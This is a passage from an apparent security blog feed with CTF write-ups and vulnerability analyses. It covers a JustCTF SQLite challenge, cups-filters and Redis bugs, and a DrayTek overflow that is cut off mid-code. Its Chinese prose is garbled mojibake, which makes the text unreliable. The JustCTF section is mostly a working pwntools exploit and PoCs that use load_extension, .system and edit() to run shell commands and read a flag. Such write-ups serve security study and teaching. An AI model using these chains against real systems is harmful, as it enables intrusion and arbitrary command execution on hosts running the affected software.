JustCTF</h3><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ä¸èƒ½ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™å¦‚ä½•åˆ©ç”¨ <code>load_extension</code> ï¼Œæ–¹æ³•æ¥åšå‘½ä»¤æ‰§è¡Œå‘¢ï¼Ÿ</p><h4 id="load-libc-so"><a href="#load-libc-so" class="headerlink" title="load libc.so"></a>load libc.so</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;puts&#39;);</code>  æ¥æ‰§è¡Œä»»æ„çš„ glibc æ–¹æ³•ï¼Œä¾‹å¦‚è¿™é‡Œçš„æ€è·¯æ˜¯</p><p>é€šè¿‡ puts ã€gets  ä¸ºé¢„æµ‹å †åœ°å€ï¼Œå¹¶å†™å…¥æˆ‘ä»¬çš„ç»“æ„ï¼Œç„¶åçˆ†ç ´å †åœ°å€è®©ä»–åœ¨æ‰§è¡Œ system çš„æ—¶å€™,ç¡®ä¿æ˜¯æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚ exploit æ¥è‡ª @n132</p><figure class="highlight python"><figcaption><span>title:"exploit for notabug2(JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./sqlite3&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;0.0.0.0&quot;,13339)</span></span><br><span class="line">p = remote(<span class="string">&#x27;notabug2.nc.jctf.pro&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;puts&#x27;);&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">lic = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">warning(hex(lic))</span><br><span class="line">pie_base = lic - <span class="number">0x1589a0</span></span><br><span class="line"></span><br><span class="line">heap = <span class="number">0x00005555556b0000</span><span class="number">-0x0000555555554000</span>+pie_base <span class="comment"># 1/0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_plt = (pie_base+0x2228C)</span></span><br><span class="line">system_plt = pie_base + <span class="number">0x10910</span></span><br><span class="line"><span class="keyword">if</span> pie_base &gt; <span class="number">0x600000000000</span>:</span><br><span class="line">    p.close()</span><br><span class="line">warning(hex(pie_base)) <span class="comment">#lic+0x28b8</span></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;gets&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(p64(heap+<span class="number">0x11eb0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pie_base+<span class="number">0x000000000009e0ad</span>))</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">dt = <span class="string">b&quot;/bin/sh\0&quot;</span>+flat([<span class="number">0</span>]*<span class="number">8</span>)+ flat([<span class="number">0</span>]*<span class="number">8</span>)+ p64(system_plt)</span><br><span class="line">sla(<span class="string">b&quot;lite&gt; &quot;</span>,<span class="string">f&quot;select cast(x&#x27;<span class="subst">&#123;dt.hex()&#125;</span>&#x27; as text), &quot;</span>.encode()+<span class="string">b&quot;Load_extension(&#x27;&quot;</span>+p64(system_plt)[:<span class="number">6</span>]+<span class="string">b&quot;&#x27;,&#x27;/bin/sh&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;echo n132&quot;</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">data = p.read(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;n132&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">    p.sendline(<span class="string">&quot;/jailed/readflag&quot;</span>)</span><br><span class="line">    input()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><h4 id="system-execute-command"><a href="#system-execute-command" class="headerlink" title=".system execute command"></a>.system execute command</h4><p>åœ¨ <code>Command Line Shell For SQLite</code> ç•Œé¢ä¸­ï¼Œ sqlite æ˜¯å†…ç½®äº†ä¸€äº›æ–¹æ³•çš„ <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">^3</a>  ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº† <code>.system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system CMD ARGSâ€¦Run CMD ARGSâ€¦ in a system shell</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œä½†æ˜¯åœ¨ JustCTF ä¸­ï¼Œ ç¨‹åºåšäº†é™åˆ¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ pwnable in /tmp/private [14:10:59]</span></span><br><span class="line">$ cat run-sqlite.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sed -ue <span class="string">&#x27;/^\./ &#123; /^\.open/!d; &#125;&#x27;</span> | /jailed/sqlite3 -interactive<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ­£åˆ™çš„è§£é‡Šå°±æ˜¯:</p><p>è¿™ä¸ªsedè„šæœ¬çš„ä½œç”¨æ˜¯ä»è¾“å…¥ä¸­ç­›é€‰å‡ºç‰¹å®šçš„è¡Œã€‚å®ƒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ã€‚è§£é‡Šä¸€ä¸‹è„šæœ¬çš„å«ä¹‰ï¼š</p><p>/^./ï¼šåŒ¹é…ä»¥.å¼€å¤´çš„è¡Œã€‚<br>{ /^.open/!d; }ï¼šå¯¹äºåŒ¹é…åˆ°çš„ä»¥.å¼€å¤´çš„è¡Œï¼Œå¦‚æœè¡Œä¸ä»¥.openå¼€å¤´ï¼Œåˆ™åˆ é™¤ï¼ˆdï¼‰è¯¥è¡Œã€‚<br>å› æ­¤ï¼Œè¿™ä¸ªsedå‘½ä»¤çš„ä½œç”¨æ˜¯åˆ é™¤ä»¥.å¼€å¤´ä½†ä¸ä»¥.openå¼€å¤´çš„è¡Œã€‚</p><p>å› æ­¤é€šå¸¸è€Œè¨€æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œ <code>.system</code> å‘½ä»¤çš„ï¼Œä½†æ˜¯å¦‚æœå’Œ <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;getchar&#39;);</code> é…åˆå°±å¯ä»¥äº†ï¼Œ è¿™æ˜¯ @crazyman èµ›åå‘ç°çš„ã€‚ å¤§æ¦‚æ˜¯æ­£åˆ™å¤šè¡ŒåŒ¹é…çš„é—®é¢˜äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select load_extension(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31&#39;, &#39;getchar&#39;);</span><br><span class="line"> .system &#x2F;jailed&#x2F;readflag</span><br><span class="line">Runtime error: error during initialization: </span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h4 id="sqlite3-edit-function-execute-command"><a href="#sqlite3-edit-function-execute-command" class="headerlink" title="sqlite3 edit function execute command"></a>sqlite3 edit function execute command</h4><p>åœ¨ sqlite è¿˜æœ‰ä¸€ä¸ªåå« <code>Edit()</code> çš„å‡½æ•° <a href="https://www.sqlite.org/cli.html">^4</a>ï¼Œ è¯¥ <code>Edit()</code> æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªå‚æ•°ã€‚ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå€¼â€”â€”é€šå¸¸æ˜¯ä¸€ä¸ªè¦ç¼–è¾‘çš„å¤§çš„å¤šè¡Œå­—ç¬¦ä¸²ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¯¹æ–‡æœ¬ç¼–è¾‘å™¨çš„è°ƒç”¨ã€‚ä»”ç»†é˜…è¯»ä»£ç ï¼Œè¯¥æ–¹æ³•å…¶å®ä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite3_create_function(p-&gt;db, <span class="string">&quot;edit&quot;</span>, <span class="number">2</span>, SQLITE_UTF8, <span class="number">0</span>,</span><br><span class="line">                            editFunc, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨åˆ° <code>editFunc</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zCmd = sqlite3_mprintf(<span class="string">&quot;%s \&quot;%s\&quot;&quot;</span>, zEditor, zTempFile);</span><br><span class="line"><span class="keyword">if</span>( zCmd==<span class="number">0</span> )&#123;</span><br><span class="line">  sqlite3_result_error_nomem(context);</span><br><span class="line">  <span class="keyword">goto</span> edit_func_end;</span><br><span class="line">&#125;</span><br><span class="line">rc = system(zCmd);</span><br><span class="line">sqlite3_free(zCmd);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åœ¨ discord çœ‹åˆ°å¦å¤–ä¸€ä¸ªé˜Ÿçš„PoCï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqlite&gt; .open :memory:</span><br><span class="line">sqlite&gt; CREATE TABLE t(a INT, b VARCHAR(200));</span><br><span class="line">sqlite&gt; insert into t values (0, &#39;&#39;);</span><br><span class="line">sqlite&gt; update t set b&#x3D;edit(&#39;&#39;,&#39;&#x2F;jailed&#x2F;readflag&#39;) where a&#x3D;0;</span><br><span class="line">justCTF&#123;SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1&#125;</span><br></pre></td></tr></table></figure><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p>1 <a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">Many-Birds-One-Stone</a><br>2 <a href="https://www.sqlite.org/c3ref/load_extension.html">load_extension</a><br>3 <a href="https://blog.csdn.net/liubingzhao/article/details/50885880">SQLite3å‘½ä»¤è¡Œçª—å£å¸¸ç”¨å‘½ä»¤</a><br>4 <a href="https://www.sqlite.org/cli.html">The edit() SQL function</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JustCTF </tag>
            
            <tag> sqlite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Real World CTF 5th writeup</title>
      <link href="RWCTF-5th-Writeup.html"/>
      <url>RWCTF-5th-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>è¿™æ¬¡ RWCTF æ¯”èµ›æˆ‘ä¸€å…±å‡ºäº†ä¸¤ä¸ªé¢˜: ã€ŒPrinter2ã€ å’Œ ã€ŒHardened Redisã€ã€‚è‡³äºä¸ºä»€ä¹ˆä»Šå¤©æ‰åœ¨åšå®¢æ›´æ–°è¿™ä¸ªWriteupä¸€ä¸ªåŸå› å°±æ˜¯ Pritner2 ç›¸å…³çš„æ¼æ´ä»Šå¤©ç»ˆäºå‘å¸ƒäº†æ­£å¼è¡¥ä¸ã€‚</p><h2 id="Printer2"><a href="#Printer2" class="headerlink" title="Printer2"></a>Printer2</h2><p>è¿™æ˜¯ <code>OpenPrinting</code> é¡¹ç›®ä¸­ <code>cups-filters</code> æ¨¡å—ä¸‹çš„ Backend Error Handlerï¼ˆç®€ç§° behï¼‰å­˜åœ¨çš„æ¼æ´ã€‚è¿™é‡Œæ˜¯å…³äº <a href="https://wiki.linuxfoundation.org/openprinting/database/backenderrorhandler">beh</a> çš„ä»‹ç»</p><p>æ¼æ´ç‚¹ä½äº <a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// (context: argv = beh &lt;job-id&gt; &lt;user&gt; &lt;title&gt; &lt;copies&gt; &lt;options&gt; [file])</span></span><br><span class="line">  <span class="built_in">snprintf</span>(cmdline, <span class="keyword">sizeof</span>(cmdline),</span><br><span class="line">  <span class="string">&quot;%s/backend/%s &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; &#x27;%s&#x27; %s&quot;</span>,</span><br><span class="line">  cups_serverbin, scheme, argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>],</span><br><span class="line">        ...</span><br><span class="line">  (argc == <span class="number">6</span> ? <span class="string">&quot;1&quot;</span> : argv[<span class="number">4</span>]),</span><br><span class="line">  argv[<span class="number">5</span>], filename);</span><br><span class="line">        ...</span><br><span class="line">retval = system(cmdline) &gt;&gt; <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„å‘½ä»¤æ³¨å…¥ï¼Œ å½“ç”¨æˆ·æ§åˆ¶ user æˆ–è€… title å­—æ®µçš„æ—¶å€™å¯ä»¥é€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æ›´è¯¦ç»†çš„ç»†èŠ‚å¯ä»¥çœ‹æˆ‘æäº¤ç»™å®˜æ–¹çš„æŠ¥å‘Šï¼š</p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters </a></p><h2 id="Hardened-Redis"><a href="#Hardened-Redis" class="headerlink" title="Hardened Redis"></a>Hardened Redis</h2><p>è¿™æ˜¯é¢˜ç›®è€ƒç‚¹æ˜¯åœ¨è¾ƒé«˜ç‰ˆæœ¬çš„æƒ…å†µä¸‹åœ¨æœ‰è®¿é—® <code>Redis</code> çš„æƒ…å†µä¸‹å¦‚ä½•è·å–  <code>Redis</code> æ‰€åœ¨ç³»ç»Ÿ shell æƒé™ã€‚ åœ¨é«˜ç‰ˆæœ¬çš„ Redis å·²ç»ä¸èƒ½ä½¿ç”¨ä¸»ä»å¤åˆ¶æ¥è·å– shelläº†ï¼ˆå°è±¡ä¸­ï¼‰ï¼Œå¦å¤–æˆ‘ä¹Ÿç¦ç”¨äº†ä¸€äº› <code>Redis</code> çš„æ–¹æ³•ã€‚ ä½†æ˜¯ç”±äºå¯¹ Redis çš„ç†ŸçŸ¥ç¨‹åº¦ä¸å¤Ÿï¼Œ å…¶æ¬¡ä¹Ÿæ˜¯å»å¹´å‚åŠ  CTF å°‘äº†ï¼Œ è¢« <a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a> çš„ä¸€ä¸ª <code>Redis</code> é¢˜çš„è§£æ³•éé¢„æœŸäº†ã€‚</p><p>ä¸‹æ¬¡æœ‰æœºä¼šå¯ä»¥å’Œå¤§å®¶è¯¦ç»†åˆ†äº«ä¸‹è¿™ä¸ªè§£æ³•ã€‚</p><p>è¿™é‡Œæ¥ç€è®²æˆ‘çš„é¢„æœŸè§£æ³•ï¼Œè®²åˆ° <code>Redis</code> ï¼Œ å¦‚æœå¤§å®¶æœ‰å°è±¡ï¼Œåº”è¯¥ä¼šæƒ³åˆ° <code>CVE-2022-0543</code> ã€‚ å½“æ—¶è¿™ä¸ªæ¼æ´å½±å“äº† Debian ç³»åˆ—çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿçš„åŒ…ç®¡ç†å™¨æ‰€å®‰è£…çš„ <code>Redis</code> ã€‚å› ä¸º Debian ç³»åˆ—ç”±äºæ‰“åŒ…é—®é¢˜ï¼ŒRedisåœ¨Luaè§£æå™¨åˆå§‹åŒ–åï¼Œpackageå˜é‡æ²¡æœ‰è¢«æ­£ç¡®æ¸…é™¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡ŒLuaæ²™ç®±é€ƒé€¸ï¼Œä»è€Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ³¨æ„åˆ°äº†è¿™ Debian ç³»åˆ—ç”¨çš„ <code>Redis</code> ï¼ˆå³ä½¿ç”¨ apt å®‰è£… ) æ‰€ä½¿ç”¨çš„ lua è§£æå™¨æ˜¯ lua 5.1 ï¼Œ è€Œä¸”æ˜¯å­˜åœ¨ä¸€ä¸ª 2015 å¹´æ¼æ´çš„ lua è§£æå™¨ï¼Œè™½ç„¶è¿™ä¸ªæ¼æ´åœ¨ 2015 å¹´å°±è¢« <a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a"><code>Redis</code>å®˜æ–¹ä¿®å¤äº†</a>ï¼Œ ä½†æ˜¯ lua 5.1 è§£æå™¨å¹¶æ²¡æœ‰ä¿®å¤ã€‚</p><p><code>apt</code> å‘½ä»¤å®‰è£…çš„redisä½¿ç”¨çš„æ˜¯å•ç‹¬çš„ liblua5.1.so.0</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" title="image-20230524155200264" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-24-b443c11f82ebe41d313bbaf1c058f8b8-87e7f8.png" alt="image-20230524155200264"></a></p><p>2015 å¹´è¿™ä¸ªæ¼æ´æ˜¯ <code>CVE-2015-4335</code>ï¼Œ å¦å¤– HN è¯„è®ºåŒºå½“æ—¶ä¹Ÿæåˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-7d5da9fdabc3b657f586d9f14af353b8-7a3f85.png"></a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still â€˜brokenâ€™ because Redis have applied custom patches to the )</a></p><p>è™½ç„¶å½“æ—¶æˆ‘ä¹Ÿç»™  ubuntu å’Œ Debian å‘äº†é‚®ä»¶æé†’äº†è¿™ä»¶äº‹ï¼Œä½†æ˜¯ä»–ä»¬çš„å›å¤çœ‹èµ·æ¥æ˜¯ä¸æ˜¯å¾ˆæƒ³å•ç‹¬ä¿®å¤ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" title="image-20230518002900794" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-05-18-e8eca39e1e8091cb3cd4123d47d5736a-1bc0a2.png" alt="image-20230518002900794"></a></p><p>è¿›ä¸€æ­¥çš„æ¼æ´åˆ©ç”¨ä¸åˆ†æå¯ä»¥å‚è€ƒæˆ‘ chu å¸ˆçˆ¶ çš„åšå®¢ï¼Œ <a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335åˆ†æ </a>ï¼Œ æˆ‘å°±ä¸èµ˜è¿°äº†ã€‚ æ²¡æƒ³åˆ°éš”äº†è¿™ä¹ˆä¹…è¿˜æ˜¯ä¾ç„¶èƒ½å—åˆ° chu å¸ˆçˆ¶çš„ç…§é¡¾ã€‚</p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><p><a href="https://github.com/OpenPrinting/cups-filters/blob/5c9498a57d3b331d9b1aa59df206b26a9510f335/backend/beh.c#L288">cups-filters/backed/beh.c#L288</a></p><p><a href="https://github.com/OpenPrinting/cups-filters/security/advisories/GHSA-gpxc-v2m8-fr3x">report a command inject Vulnerabilities in cups-filters</a></p><p><a href="https://hackmd.io/@Xion/goq_22s_authors_writeup">2022 Spring GoN Open Qual CTF</a></p><p><a href="https://news.ycombinator.com/item?id=30617641">I think this is still â€˜brokenâ€™ because Redis have applied custom patches to the â€¦ | Hacker News (ycombinator.com)</a></p><p><a href="https://github.com/redis/redis/commit/49efe300af258e83f377cd8142d2c67d66fc2e3a">disable loading lua bytecode</a></p><p><a href="https://mp.weixin.qq.com/s/JxZC5pqi92xEOUT3BKdyWg">Redis CVE-2015-4335åˆ†æ </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2023-24805 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-32548 DrayTeck æ ˆæº¢å‡ºæ¼æ´åˆ†æ</title>
      <link href="CVE-2022-32548-DrayTeck-BufferOverflow.html"/>
      <url>CVE-2022-32548-DrayTeck-BufferOverflow.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘å»å¹´ 9 æœˆä»½å¤ç°çš„ï¼Œä¸€ç›´æ‹–æ›´æ²¡æœ‰å‘å¸ƒåœ¨æˆ‘çš„ Blog ã€‚å› ä¸ºåˆ°è€ƒè™‘ Blog å¤ªä¹…æ²¡æ›´æ–°äº†ï¼Œæ‰€ä»¥è¶ç€å‡æœŸæ•´ç†ä¸‹ç¬”è®°ï¼Œç„¶åå‘è¡¨åœ¨ Blog ä¸Šå§ã€‚é¡ºä¾¿ä¸€æï¼Œ æœ¬ç¯‡æ–‡ç« æ²¡æœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡ï¼Œå¤§ä½¬å¯ä»¥å¿½ç•¥ä¸çœ‹äº†ã€‚</p><p>æˆ‘è¿™é‡Œåˆ†æçš„ç‰ˆæœ¬æ˜¯ Vigor 2912 å‹å· , å›ºä»¶ç‰ˆæœ¬ä¸º 3.8.12 ã€‚å›ºä»¶å¯ä»¥ä»<a href="https://fw.draytek.com.tw/">å®˜ç½‘ä¸‹è½½</a> [^1], ä½†æ˜¯è¿™ä¸ªå±äºDrayOS çš„ç³»ç»Ÿå›ºä»¶æ˜¯éœ€è¦é€†å‘è§£å‹ä»£ç çš„ï¼Œè¿™éƒ¨åˆ†å†…å®¹ä¸åœ¨æœ¬ç¯‡æ–‡ç« çš„è®¨è®ºèŒƒå›´ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒæ¼æ´çš„ä½œè€… slide[^2] ã€‚è¿™é‡Œæˆ‘å°±ä¸å±•å¼€èµ˜è¿°äº†ã€‚</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>è§£å‹å›ºä»¶åï¼Œ æˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ª RTOS çš„å¤§Binary æ–‡ä»¶, æˆ‘ä»¬å¯ä»¥é€šè¿‡ rbasefind[^3] æˆ–è€…å…¶ä»–æ–¹æ³•è·å–å›ºä»¶çš„åŠ è½½åŸºåœ°å€ï¼Œä¾‹å¦‚æˆ‘è¿™é‡Œä½¿ç”¨ rbasefind æŸ¥æ‰¾å‡ºäº†ä¸€ä¸ªç»“æœï¼š0x80020000</p><p>é€šè¿‡ IDA åŠ è½½è®¾ç½®å¥½åŠ è½½åœ°å€ï¼Œç„¶åç­‰å¾…åˆ†æç»“æŸã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥å†é˜…è¯»ä¸‹æ¼æ´é€šå‘Š[^4]çš„æè¿°:</p><p>Exploitation attempts can be detected by logging/alerting when a malformed base64 string is sent via a POST request to the /cgi-bin/wlogin.cgi end-point on the web management interface router. Base64 encoded strings are expected to be found in the aa and ab fields of the POST request. Malformed base64 strings indicative of an attack would have an abnormally high number of %3D padding. Any number over three should be considered suspicious.</p><p>é€šè¿‡è¿™ä¸ªæè¿°æˆ‘ä»¬å¯ä»¥å¾—å‡ºå‡ ä¸ªç»“è®ºï¼š</p><ol><li>é€šè¿‡è§¦å‘æ¥å£æ˜¯  <code>/cgi-bin/wlogin.cgi</code> å³ç™»å½•æ¥å£</li><li>æåˆ°äº† <code>%3D</code> å¯ä»¥çŒœæµ‹æ¼æ´å‡ºç°åœ¨ <code>base64_decode</code> å‡½æ•°ä¸­ </li></ol><p>ç´§æ¥ç€æˆ‘æŠ“å»äº†ä¸€ä¸ªæ­£å¸¸ç™»å½•çš„ HTTP è¯·æ±‚åŒ…ï¼Œç­‰å¾… IDA åˆ†æå®Œä¹‹åé€šè¿‡å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„æ¼æ´å‡½æ•°ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-20-c69eb298cb0fe09abc4ea7d5405e0a30-6e9f0e.png"></a></p><p>å¯ä»¥çœ‹åˆ° username  å’Œ password éƒ½ä¼šé€šè¿‡ base64_decode è¿™ä¸ªå‡½æ•°è¿›è¡Œè§£å¯†ï¼Œè¿™ä¸ªå‡½æ•°çš„å‚æ•°æ ¼å¼ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode(<span class="keyword">char</span> *input, <span class="keyword">char</span> *output, <span class="keyword">unsigned</span> <span class="keyword">int</span> 